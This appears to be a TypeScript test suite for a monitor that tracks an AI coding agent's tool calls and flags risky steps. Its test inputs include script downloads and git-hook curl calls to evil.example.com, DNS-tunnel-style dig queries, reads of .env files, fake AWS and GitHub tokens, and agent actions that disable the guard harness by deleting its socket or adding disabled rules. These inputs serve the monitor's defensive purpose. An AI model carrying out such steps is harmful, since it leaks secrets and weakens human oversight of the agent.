import { nonNull } from "../../lib/non-null.js";
import { describe, expect, it } from "vitest";

import { anchorHash, sha256 } from "./helpers.js";
import { applyEvent, createState } from "./state.js";
import type { ToolEvent, TrajectoryState } from "./types.js";

const AWS_KEY = `AKIA${"QUENTINCODY12345"}`;
const GH_PAT = `ghp_${"q".repeat(36)}`;

let seq = 0;
function nextId(): string {
	seq += 1;
	return `t${seq}`;
}
function editEvents(
	file: string,
	oldStr: string,
	newStr: string,
	opts: { fail?: boolean; outcome?: "success" | "fail"; tool?: "Edit" | "Write" } = {},
): ToolEvent[] {
	const tool = opts.tool ?? "Edit";
	const id = nextId();
	const input = { file_path: file, old_string: oldStr, new_string: newStr };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool, toolUseId: id, hook: "PreToolUse", input },
		{
			ts: "2026-01-01T00:00:01Z",
			session: "s",
			agent: "a",
			tool,
			toolUseId: id,
			hook: "PostToolUse",
			input,
			contentSha256: sha256(newStr),
			toolOutcome: opts.outcome ?? "success",
			checkDecision: "allow",
			failedCheckIds: opts.fail ? ["c"] : [],
		},
	];
}
function bashEvents(command: string, outcome: "success" | "fail" = "success"): ToolEvent[] {
	const id = nextId();
	const input = { command };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Bash", toolUseId: id, hook: "PreToolUse", input },
		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Bash", toolUseId: id, hook: "PostToolUse", input, toolOutcome: outcome },
	];
}
function readEvents(file: string): ToolEvent[] {
	const id = nextId();
	const input = { file_path: file };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Read", toolUseId: id, hook: "PreToolUse", input },
		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Read", toolUseId: id, hook: "PostToolUse", input },
	];
}
function postEdit(input: ToolEvent["input"], extra: Partial<ToolEvent> = {}): ToolEvent {
	return {
		ts: "2026-01-01T00:00:01Z",
		session: "s",
		agent: "a",
		tool: "Edit",
		toolUseId: nextId(),
		hook: "PostToolUse",
		input,
		...extra,
	};
}
function feed(events: ToolEvent[]): TrajectoryState {
	const state = createState("s");
	for (const ev of events) applyEvent(state, ev);
	return state;
}

describe("createState", () => {
	it("allocates an empty state with correct defaults", () => {
		const s = createState("sess-1");
		expect(s.session).toBe("sess-1");
		expect(s.stepCount).toBe(0);
		expect(s.greenCount).toBe(0);
		expect(s.harnessDisabled).toBeNull();
		expect(s.fileShaHistory.size).toBe(0);
		expect(s.taintedSecretTokens.size).toBe(0);
		expect(s.seedFiles).toEqual([]);
		expect(s.dnsQueries).toEqual([]);
	});
});

describe("applyEvent — churn substrate folding", () => {
	it("folds sha history, edit log, and current sha on a PostToolUse edit", () => {
		const s = feed(editEvents("src/a.ts", "", "hello"));
		expect(s.fileShaHistory.get("src/a.ts")?.length).toBe(1);
		expect(s.currentFileShas.get("src/a.ts")).toBe(sha256("hello"));
		expect(s.fileEditLog.get("src/a.ts")?.length).toBe(1);
	});

	it("increments stepCount on every applyEvent (pre + post)", () => {
		const s = feed(editEvents("src/a.ts", "", "x"));
		expect(s.stepCount).toBe(2); // one pre + one post
	});

	it("does NOT fold edit state on a PreToolUse-only event", () => {
		const s = createState("s");
		const [pre] = editEvents("src/a.ts", "", "x");
		applyEvent(s, nonNull(pre));
		expect(s.fileShaHistory.size).toBe(0);
		expect(s.recentEvents.length).toBe(1);
	});

	it("counts a PostToolUse Grep event toward searchCount", () => {
		const s = createState("s");
		const grep: ToolEvent = {
			ts: "2026-01-01T00:00:00Z",
			session: "s",
			agent: "a",
			tool: "Grep",
			toolUseId: nextId(),
			hook: "PostToolUse",
			input: {},
		};
		applyEvent(s, grep);
		expect(s.searchCount).toBe(1);
	});

	it("counts a PostToolUse Glob event toward searchCount", () => {
		const s = createState("s");
		const glob: ToolEvent = {
			ts: "2026-01-01T00:00:00Z",
			session: "s",
			agent: "a",
			tool: "Glob",
			toolUseId: nextId(),
			hook: "PostToolUse",
			input: {},
		};
		applyEvent(s, glob);
		expect(s.searchCount).toBe(1);
	});

	it("does not count an unrelated PostToolUse tool as a search", () => {
		const s = createState("s");
		applyEvent(s, postEdit({} , { tool: "Other" }));
		expect(s.searchCount).toBe(0);
	});

	it("freezes the first 3 distinct edited files as seeds", () => {
		const s = feed([
			...editEvents("src/a.ts", "", "1"),
			...editEvents("src/b.ts", "", "2"),
			...editEvents("src/c.ts", "", "3"),
			...editEvents("src/d.ts", "", "4"),
		]);
		expect(s.seedFiles).toEqual(["src/a.ts", "src/b.ts", "src/c.ts"]);
	});

	it("increments editsSinceGreen on a failing edit and resets on a clean one", () => {
		const s = feed([
			...editEvents("src/a.ts", "", "1", { fail: true }),
			...editEvents("src/a.ts", "1", "2", { fail: true }),
		]);
		expect(s.editsSinceGreen.get("src/a.ts")).toBe(2);
		applyEventAll(s, editEvents("src/a.ts", "2", "3")); // clean
		expect(s.editsSinceGreen.get("src/a.ts")).toBe(0);
		expect(s.greenCount).toBe(1);
	});

	it("updates the worktree snapshot when a sha lands", () => {
		const s = feed([...editEvents("src/a.ts", "", "1"), ...editEvents("src/b.ts", "", "2")]);
		expect(s.worktreeSnapshots.length).toBe(2);
		expect(s.worktreeSnapshots[0]).not.toBe(s.worktreeSnapshots[1]);
	});

	it("does NOT increment successfulEditCount when the tool outcome is fail", () => {
		const s = feed(editEvents("src/a.ts", "", "1", { outcome: "fail" }));
		expect(s.successfulEditCount).toBe(0);
		expect(s.editsSinceGreen.get("src/a.ts")).toBe(1);
	});

	it("worktree snapshot hash is independent of file insertion order", () => {
		const s1 = feed([
			...editEvents("src/e.ts", "", "5"),
			...editEvents("src/d.ts", "", "4"),
			...editEvents("src/c.ts", "", "3"),
			...editEvents("src/b.ts", "", "2"),
			...editEvents("src/a.ts", "", "1"),
		]);
		const s2 = feed([
			...editEvents("src/a.ts", "", "1"),
			...editEvents("src/b.ts", "", "2"),
			...editEvents("src/c.ts", "", "3"),
			...editEvents("src/d.ts", "", "4"),
			...editEvents("src/e.ts", "", "5"),
		]);
		const last1 = s1.worktreeSnapshots[s1.worktreeSnapshots.length - 1];
		const last2 = s2.worktreeSnapshots[s2.worktreeSnapshots.length - 1];
		expect(last1).toBe(last2);
	});

	it("uses empty fallbacks for missing edit content and old text", () => {
		const s = createState("s");
		applyEvent(s, postEdit({ file_path: "src/a.ts" }));
		const record = s.fileEditLog.get("src/a.ts")?.[0];
		expect(record?.new).toBe("");
		expect(record?.old).toBe("");
		expect(record?.anchor).toBe(anchorHash(""));
		expect(s.anchorValueSeq.get(`src/a.ts ${anchorHash("")}`)?.[0]?.valueHash).toBe(sha256(""));
	});

	it("ignores an edit without a file path", () => {
		const s = createState("s");
		applyEvent(s, postEdit({}, { contentSha256: sha256("x") }));
		expect(s.successfulEditCount).toBe(0);
		expect(s.fileEditLog.size).toBe(0);
		expect(s.seedFiles).toEqual([]);
	});

	it("treats a blocked edit as failed even without failed check ids", () => {
		const s = createState("s");
		applyEvent(
			s,
			postEdit(
				{ file_path: "src/a.ts", new_string: "x" },
				{ contentSha256: sha256("x"), checkDecision: "block", failedCheckIds: [] },
			),
		);
		expect(s.greenCount).toBe(0);
		expect(s.successfulEditCount).toBe(1);
		expect(s.editsSinceGreen.get("src/a.ts")).toBe(1);
		expect(s.fileEditLog.get("src/a.ts")?.[0]?.failedCheck).toBe(true);
	});

	it("does not create sha history when an edit has no content hash", () => {
		const s = createState("s");
		applyEvent(s, postEdit({ file_path: "src/a.ts", new_string: "x" }));
		expect(s.fileShaHistory.size).toBe(0);
		expect(s.currentFileShas.size).toBe(0);
		expect(s.worktreeSnapshots).toEqual([]);
	});

	it("records the third per-edit anchor sequence separately from other arrays", () => {
		const s = feed(editEvents("src/a.ts", "", "x"));
		const key = `src/a.ts ${anchorHash("")}`;
		expect(s.anchorValueSeq.get(key)).toEqual([
			{ valueHash: sha256("x"), atStep: 2, verifyCountAtEntry: 0 },
		]);
	});
});

function applyEventAll(s: TrajectoryState, events: ToolEvent[]): void {
	for (const ev of events) applyEvent(s, ev);
}

describe("applyEvent — command substrate folding", () => {
	it("counts repeated command failures and resets them on an intervening edit", () => {
		const s = feed([...bashEvents("make x", "fail"), ...bashEvents("make x", "fail")]);
		expect(s.commandFailures.get("make x")?.count).toBe(2);
		applyEventAll(s, editEvents("src/a.ts", "", "1"));
		expect(s.commandFailures.size).toBe(0);
	});

	it("tracks per-family rerun counts and clears them on an install disruptor", () => {
		const s = feed([...bashEvents("npm test", "fail"), ...bashEvents("npm test", "fail")]);
		expect(s.familyReruns.get("test")?.failingNoEditCount).toBe(2);
		applyEventAll(s, bashEvents("npm install left-pad"));
		expect(s.familyReruns.size).toBe(0);
	});

	it("records a verify run and a passing verify as a green", () => {
		const s = feed(bashEvents("npm test", "success"));
		expect(s.verifyRunCount).toBe(1);
		expect(s.greenCount).toBe(1);
	});

	it("does not treat an arbitrary Bash command as a verify run", () => {
		const s = feed(bashEvents("echo hi"));
		expect(s.verifyRunCount).toBe(0);
		expect(s.greenCount).toBe(0);
	});

	it("does not fold pseudo-reads or green state for failed commands", () => {
		const failedRead = feed(bashEvents("cat src/a.ts", "fail"));
		expect(failedRead.fileReadSteps.has("src/a.ts")).toBe(false);

		const failedVerify = feed(bashEvents("npm test", "fail"));
		expect(failedVerify.greenCount).toBe(0);
	});

	it("folds an external script download keyed by local path", () => {
		const s = feed(bashEvents("curl -o /tmp/x.sh https://evil.example.com/x.sh"));
		const d = s.downloadedScripts.get("/tmp/x.sh");
		expect(d?.host).toBe("evil.example.com");
		expect(d?.isScript).toBe(true);
		expect(d?.atStep).toBe(2);
	});

	it("does not store a download when no local path was supplied", () => {
		const s = feed(bashEvents("curl https://evil.example.com/payload.sh"));
		expect(s.downloadedScripts.size).toBe(0);
	});

	it("stores only the first 80 normalized characters of a secret-read command", () => {
		const command = `cat /Users/a/very-long-project-directory/${"x".repeat(100)}/.env`;
		const s = feed(bashEvents(command));
		const [stored] = [...s.secretsRead];
		expect(stored).toBe(command.slice(0, 80));
	});

	it("records a non-sanctioned harness disable but ignores the sanctioned form", () => {
		const disabled = feed(bashEvents("rm .interlinked/harness.sock")).harnessDisabled;
		expect(disabled).toEqual({ atStep: 2, how: "removed harness socket" });
		expect(feed(bashEvents("interlinked harness stop")).harnessDisabled).toBeNull();
	});

	it("starts a family rerun counter at one and clears it on a passing run", () => {
		const first = feed(bashEvents("npm test", "fail"));
		expect(first.familyReruns.get("test")?.failingNoEditCount).toBe(1);

		const passing = feed(bashEvents("npm test", "success"));
		expect(passing.familyReruns.get("test")?.failingNoEditCount).toBe(0);
	});

	it("folds only high-entropy, non-hex DNS labels", () => {
		const hi = feed(bashEvents("dig gx7mq2zv9kw3pf8rt5nhac.evil.example.com"));
		expect(hi.dnsQueries.length).toBe(1);
		const lo = feed(bashEvents("dig www.evil.example.com"));
		expect(lo.dnsQueries.length).toBe(0);
		const hex = feed(bashEvents("dig abcdef0123456789abcd.evil.example.com"));
		expect(hex.dnsQueries.length).toBe(0);
	});

	it("records a secret read via Read of a credential path", () => {
		const s = feed(readEvents(".env"));
		expect(s.secretsRead.has(".env")).toBe(true);
		expect(s.lastSecretReadStep).toBeGreaterThan(0);
	});

	it("does nothing when a Bash event carries an empty command", () => {
		const s = feed(bashEvents(""));
		expect(s.verifyRunCount).toBe(0);
		expect(s.commandFailures.size).toBe(0);
		expect(s.downloadedScripts.size).toBe(0);
	});

	it("tracks a build-family verify run separately from test", () => {
		const s = feed([...bashEvents("npm run build", "fail"), ...bashEvents("npm run build", "fail")]);
		expect(s.familyReruns.get("build")?.failingNoEditCount).toBe(2);
		expect(s.familyReruns.has("test")).toBe(false);
	});

	it("counts a lint verify run without tracking a family-rerun entry", () => {
		const s = feed(bashEvents("npx eslint .", "fail"));
		expect(s.verifyRunCount).toBe(1);
		expect(s.familyReruns.size).toBe(0);
	});
});

describe("applyEvent — security edit folding", () => {
	it("taints a structured secret token introduced via edit content", () => {
		const s = feed(editEvents("src/x.ts", "", `const k = "${GH_PAT}";`));
		expect(s.taintedSecretTokens.has(GH_PAT)).toBe(true);
	});

	it("records a scrubbed secret (present in old, absent in new)", () => {
		const s = feed(editEvents("src/x.ts", `k="${AWS_KEY}"`, "k=env()"));
		expect(s.scrubbedSecretHashes.has(sha256(AWS_KEY))).toBe(true);
	});

	it("does not mark a secret as scrubbed while it remains in new content", () => {
		const s = feed(editEvents("src/x.ts", `k="${AWS_KEY}"`, `k="${AWS_KEY}";`));
		expect(s.scrubbedSecretHashes.has(sha256(AWS_KEY))).toBe(false);
	});

	it("tracks a pending secret write to an env file and clears it when removed", () => {
		const s = feed(editEvents(".env", "", `API_KEY=${AWS_KEY}`, { tool: "Write" }));
		expect(s.pendingSecretWrites.get(".env")).toEqual({ kind: "aws_access_key", atStep: 2 });
		applyEventAll(s, editEvents(".env", `API_KEY=${AWS_KEY}`, "API_KEY=", { tool: "Write" }));
		expect(s.pendingSecretWrites.has(".env")).toBe(false);
	});

	it("does not create an env pending-write record for a source file", () => {
		const s = feed(editEvents("src/normal.ts", "", `const key = "${AWS_KEY}";`));
		expect(s.pendingSecretWrites.size).toBe(0);
	});

	it("records a git-hook write and whether it carries a sink", () => {
		const withSink = feed(editEvents(".git/hooks/pre-commit", "", "curl https://evil.example.com", { tool: "Write" }));
		expect(withSink.gitHookWrites.get("pre-commit")?.hasSink).toBe(true);
		const noSink = feed(editEvents(".git/hooks/pre-commit", "", "echo hi", { tool: "Write" }));
		expect(noSink.gitHookWrites.get("pre-commit")?.hasSink).toBe(false);
	});

	it("requires a git-hook path to end at the hook name", () => {
		const s = feed(editEvents(".git/hooks/pre-commit/extra", "", "curl https://evil.example.com"));
		expect(s.gitHookWrites.size).toBe(0);
	});

	it("records harness disable metadata only for guard-rules files that grow disabled_rules", () => {
		const nonConfig = feed(editEvents("src/config.ts", "{}", '{"disabled_rules":["x"]}'));
		expect(nonConfig.harnessDisabled).toBeNull();

		const base = feed(editEvents(".interlinked/guard-rules.json", "{}", '{"disabled_rules":["x"]}'));
		expect(base.harnessDisabled).toEqual({ atStep: 2, how: "grew disabled_rules" });

		const local = feed(editEvents(".interlinked/guard-rules.local.json", "{}", '{"disabled_rules":["x"]}'));
		expect(local.harnessDisabled?.how).toBe("grew disabled_rules");
	});

	// test-contract: public-api — both the committed and machine-local guard-rules config names activate the disable trajectory marker
	it("recognizes both guard-rules config variants without cross-contaminating them", () => {
		const base = feed(editEvents(".interlinked/guard-rules.json", "{}", '{"disabled_rules":["x"]}'));
		const local = feed(editEvents(".interlinked/guard-rules.local.json", "{}", '{"disabled_rules":["x"]}'));
		expect(base.harnessDisabled).toEqual({ atStep: 2, how: "grew disabled_rules" });
		expect(local.harnessDisabled).toEqual({ atStep: 2, how: "grew disabled_rules" });
	});

	it("does not flag a guard-rules file when disabled_rules did not grow", () => {
		const s = feed(
			editEvents(
				".interlinked/guard-rules.json",
				'{"disabled_rules":["x"]}',
				'{"disabled_rules":["x"]}',
			),
		);
		expect(s.harnessDisabled).toBeNull();
	});
});

describe("applyEvent — read folding + read/edit-balance substrate", () => {
	it("does nothing on a Read event with no file_path", () => {
		const s = createState("s");
		const read: ToolEvent = {
			ts: "2026-01-01T00:00:00Z",
			session: "s",
			agent: "a",
			tool: "Read",
			toolUseId: nextId(),
			hook: "PostToolUse",
			input: {},
		};
		applyEvent(s, read);
		expect(s.readCount).toBe(0);
		expect(s.fileReadSteps.size).toBe(0);
	});

	it("increments readCount for a Read event", () => {
		const s = feed(readEvents("src/file.ts"));
		expect(s.readCount).toBe(1);
	});

	it("does not classify an ordinary Read path as secret", () => {
		const s = feed(readEvents("src/file.ts"));
		expect(s.secretsRead.has("src/file.ts")).toBe(false);
	});

	it("counts a grep segment toward searchCount and records a slashed path but not a bare word", () => {
		const s = feed(bashEvents("grep foo src/file.ts"));
		expect(s.searchCount).toBe(1);
		expect(s.fileReadSteps.has("src/file.ts")).toBe(true);
		expect(s.fileReadSteps.has("foo")).toBe(false);
	});

	it("supports every search verb and records its named path", () => {
		for (const verb of ["grep", "rg", "fd", "find", "ag", "ack"]) {
			const s = feed(bashEvents(`${verb} needle src/${verb}.ts`));
			expect(s.searchCount, verb).toBe(1);
			expect(s.fileReadSteps.has(`src/${verb}.ts`), verb).toBe(true);
		}
	});

	it("supports every inspect verb", () => {
		for (const verb of ["cat", "head", "tail", "sed", "awk", "less", "more", "bat"]) {
			const s = feed(bashEvents(`${verb} src/${verb}.ts`));
			expect(s.fileReadSteps.has(`src/${verb}.ts`), verb).toBe(true);
		}
	});

	it("does not treat arbitrary commands as read-balance searches", () => {
		const s = feed(bashEvents("echo src/not-read.ts"));
		expect(s.searchCount).toBe(0);
		expect(s.fileReadSteps.has("src/not-read.ts")).toBe(false);
	});

	// test-contract: public-api — a successful inspect command records its pseudo-read and does not enter failed-command state
	it("records a successful inspect command as a pseudo-read", () => {
		const s = feed(bashEvents("cat src/observed.ts", "success"));
		expect(s.fileReadSteps.get("src/observed.ts")).toBe(2);
		expect(s.commandFailures).toEqual(new Map());
	});

	it("does not treat the inspect executable itself as a named path", () => {
		const s = feed(bashEvents("./cat src/file.ts"));
		expect(s.fileReadSteps.has("./cat")).toBe(false);
		expect(s.fileReadSteps.has("src/file.ts")).toBe(true);
	});

	it("skips a flag token and records a dotted-extension token with no path separator", () => {
		const s = feed(bashEvents("cat -n file.txt"));
		expect(s.fileReadSteps.has("-n")).toBe(false);
		expect(s.fileReadSteps.has("file.txt")).toBe(true);
	});

	it("skips flag-looking dotted tokens but retains non-flag trailing-dash paths", () => {
		const s = feed(bashEvents("cat -n.ts dir-/file-"));
		expect(s.fileReadSteps.has("-n.ts")).toBe(false);
		expect(s.fileReadSteps.has("dir-/file-")).toBe(true);
	});

	it("only recognizes a short extension at the end of a token", () => {
		const s = feed(bashEvents("cat name.ts.verylongextension"));
		expect(s.fileReadSteps.has("name.ts.verylongextension")).toBe(false);
	});

	it("preserves embedded quotes except for one boundary quote on each side", () => {
		const s = feed(bashEvents('cat "weird"name.ts'));
		expect(s.fileReadSteps.has('weird"name.ts')).toBe(true);
		expect(s.fileReadSteps.has("weirdname.ts")).toBe(false);
	});

	it("evicts the oldest read once fileReadSteps exceeds its cap", () => {
		const events: ToolEvent[] = [];
		for (let i = 0; i < 513; i++) events.push(...readEvents(`f${i}.ts`));
		const s = feed(events);
		expect(s.fileReadSteps.size).toBe(512);
		expect(s.fileReadSteps.has("f0.ts")).toBe(false);
		expect(s.fileReadSteps.has("f512.ts")).toBe(true);
	});

	it("normalizes all whitespace runs to one space before hashing", () => {
		const content = " first\t\n  second ";
		const s = feed(editEvents("src/a.ts", "", content));
		expect(s.fileShaHistory.get("src/a.ts")?.[0]?.normSha).toBe(sha256("first second"));
	});

	it("serializes sorted worktree entries with newline separators", () => {
		const a = sha256("a");
		const b = sha256("b");
		const s = feed([
			...editEvents("src/b.ts", "", "b"),
			...editEvents("src/a.ts", "", "a"),
		]);
		expect(s.worktreeSnapshots.at(-1)).toBe(sha256(`src/a.ts:${a}\nsrc/b.ts:${b}`));
	});

	it("orders a greater key after a smaller key in the worktree serializer", () => {
		const s = feed([
			...editEvents("z.ts", "", "z"),
			...editEvents("a.ts", "", "a"),
		]);
		expect(s.worktreeSnapshots.at(-1)).toBe(sha256(`a.ts:${sha256("a")}\nz.ts:${sha256("z")}`));
	});

	// test-contract: invariant — worktree snapshots serialize keys lexicographically, regardless of edit insertion order
	it("keeps worktree serialization stable for reverse insertion order", () => {
		const s = feed([
			...editEvents("z.ts", "", "z"),
			...editEvents("m.ts", "", "m"),
			...editEvents("a.ts", "", "a"),
		]);
		expect(s.worktreeSnapshots.at(-1)).toBe(
			sha256(`a.ts:${sha256("a")}\nm.ts:${sha256("m")}\nz.ts:${sha256("z")}`),
		);
	});
});

describe("applyEvent — bounds + determinism", () => {
	it("caps the rolling event window at 64", () => {
		const events: ToolEvent[] = [];
		for (let i = 0; i < 100; i++) events.push(...bashEvents(`echo ${i}`));
		const s = feed(events);
		expect(s.recentEvents.length).toBe(64);
	});

	it("caps per-file sha history at 64", () => {
		const events: ToolEvent[] = [];
		for (let i = 0; i < 100; i++) events.push(...editEvents("src/a.ts", `v${i}`, `v${i + 1}`));
		const s = feed(events);
		expect(s.fileShaHistory.get("src/a.ts")?.length).toBe(64);
	});

	it("is deterministic — identical input yields identical projected state", () => {
		const build = (): ToolEvent[] => [
			...editEvents("src/a.ts", "", "1", { fail: true }),
			...bashEvents("npm test", "fail"),
			...editEvents("src/x.ts", "", `const k = "${GH_PAT}";`),
			...readEvents(".env"),
			...bashEvents("dig gx7mq2zv9kw3pf8rt5nhac.evil.example.com"),
		];
		seq = 0;
		const a = project(feed(build()));
		seq = 0;
		const b = project(feed(build()));
		expect(a).toEqual(b);
	});
});

function project(s: TrajectoryState): unknown {
	return {
		stepCount: s.stepCount,
		greenCount: s.greenCount,
		successfulEditCount: s.successfulEditCount,
		verifyRunCount: s.verifyRunCount,
		seedFiles: s.seedFiles,
		shaHistory: [...s.fileShaHistory].map(([k, v]) => [k, v.map((e) => e.sha)]),
		editsSinceGreen: [...s.editsSinceGreen].sort(),
		commandFailures: [...s.commandFailures].map(([k, v]) => [k, v.count]).sort(),
		tainted: [...s.taintedSecretTokens].sort(),
		scrubbed: [...s.scrubbedSecretHashes].sort(),
		secretsRead: [...s.secretsRead].sort(),
		dns: s.dnsQueries.map((q) => `${q.baseDomain}/${q.label}`),
		harnessDisabled: s.harnessDisabled?.how ?? null,
	};
}
